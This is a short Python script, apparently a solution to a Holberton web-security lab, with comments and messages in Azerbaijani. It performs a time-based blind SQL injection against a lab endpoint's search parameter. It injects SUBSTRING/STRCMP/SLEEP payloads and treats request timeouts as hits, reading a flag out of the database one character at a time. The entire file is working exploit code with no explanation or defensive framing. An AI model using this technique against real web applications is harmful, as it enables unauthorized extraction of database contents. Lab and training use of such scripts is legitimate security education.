import requests
import time

url = "http://web0x01.hbtn/a3/sql_injection/api/all_orders"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
flag = "Holberton{"

print("[*] Bayrağın simvolları bir-bir oxunur...")

while True:
    char_found = False
    for c in charset:
        test_flag = flag + c
        # SUBSTRING vasitəsilə simvolları yoxlayırıq
        payload = f"test' AND (SELECT IF(STRCMP(SUBSTRING((SELECT flag FROM flags LIMIT 1), 1, {len(test_flag)}), '{test_flag}')=0, SLEEP(5), 0))--"
        
        start = time.time()
        try:
            requests.get(url, params={"search": payload}, timeout=7)
        except requests.exceptions.Timeout:
            flag += c
            print(f"[+] Tapıldı: {flag}")
            char_found = True
            if c == "}":
                print(f"[SUCCESS] Tam Bayraq: {flag}")
                with open("3-flag.txt", "w") as f:
                    f.write(flag + "\n")
                exit(0)
            break
    if not char_found:
        print("[-] Simvol tapılmadı, dövr bitdi.")
        break
